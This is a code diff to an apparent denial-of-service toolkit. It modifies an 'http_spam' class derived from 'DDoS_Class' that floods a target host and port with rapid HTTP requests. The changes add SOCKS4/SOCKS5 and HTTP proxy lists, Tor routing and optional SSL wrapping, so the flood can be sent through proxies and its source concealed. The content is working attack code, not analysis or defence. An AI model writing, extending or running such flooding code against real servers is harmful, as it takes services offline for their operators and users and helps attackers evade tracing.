@@ -20,9 +20,18 @@ class http_spam(DDoS_Class):
         round_max=10000,
         interval=0.001,
         duration=60,
-        logs=False,
         tor=False,
+        http_proxies=None,
+        socks4_proxies=None,
+        socks5_proxies=None,
+        ssl_on=False,
+        logs=True,
     ):
+        self.ssl_on=ssl_on
+        self.proxies=get_socket_proxies_from_parameters(http_proxies=http_proxies,socks4_proxies=socks4_proxies,socks5_proxies=socks5_proxies)
+        self.proxies=[x for x in self.proxies if x['proxy_type'] in ['socks4','socks5','s4','s5']]
+        if self.proxies==[]:
+            self.proxies=[{'proxy_host':None,'proxy_port':None,'proxy_username':None,'proxy_password':None,'proxy_type':None}]
         self.logs = logs
         self.cookie = cookie
         self.user_agents = user_agents
@@ -64,14 +73,12 @@ class http_spam(DDoS_Class):
                 if self.stop == True:
                     break
                 try:
-                    s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
-                    if self.tor == False:
-                        s.settimeout = self.timeout
-                    if self.tor == True:
-                        s.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
-                    s.connect((self.target, self.port))
-                    if (self.port == 443) or (self.port == 8443):
-                        s = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
+                    if self.tor==True:
+                        s=get_tor_socket_connection(self.target,self.port,timeout=self.timeout)
+                    else:
+                        s=get_socket_connection(self.target,self.port,timeout=self.timeout)
+                    if self.port==443 or self.ssl_on==True:
+                        s=wrap_socket_with_ssl(s,self.target)
                     for l in range(random.randint(self.round_min, self.round_max)):
                         if self.method == 3:
                             ty = random.randint(1, 2)
@@ -106,7 +113,8 @@ class http_spam(DDoS_Class):
                                 sys.stdout.flush()
                                 # print("Request: {} | Type: {} | Bytes: {}".format(http_counter,req,len(m)))
                             time.sleep(self.interval)
-                        except:
+                        except Exception as ex:
+                            print(ex)
                             break
                         time.sleep(self.interval)
                     s.close()
